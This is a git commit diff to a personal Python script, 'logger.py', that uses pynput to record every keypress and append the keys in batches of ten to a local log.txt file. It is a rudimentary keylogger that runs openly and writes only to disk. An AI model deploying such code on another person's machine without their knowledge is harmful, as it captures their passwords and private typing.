f0958469d1d2504088462d2a34e9817c64bde291
Myran Teasdale <myran.teasdale@outlook.com>
2023-05-16 19:35:28 +0100

    updates

--- personal_projects/logger.py
+++ personal_projects/logger.py
@@ -1,23 +1,31 @@
 import keyboard
 from pynput.keyboard import Key, Listener
 
+#GLOBAL VARIABLES
 message = ''
+count = 0
+keys = []
+
 def get_keypress(key):
+    global keys, count
     print(f"You pressed the {key} key.")
+    keys.append(key)
+    count += 1
+
+    if count >= 10:
+        count = 0
+        write(keys)
+        keys = []
 
 def get_keyrelease(key):
     message = ''
     if key == Key.esc:
         return False
-    if key == Key.delete:
-        message = message[-1]
-    else:
-        message += message
 
 def write(keys):
-    with open('log.txt', 'a') as f:
+    with open("log.txt", "a") as f:
         for key in keys:
-            f.write(key)
+            f.write(str(key))
 
 with Listener(on_press=get_keypress, on_release=get_keyrelease) as listener:
     listener.join()
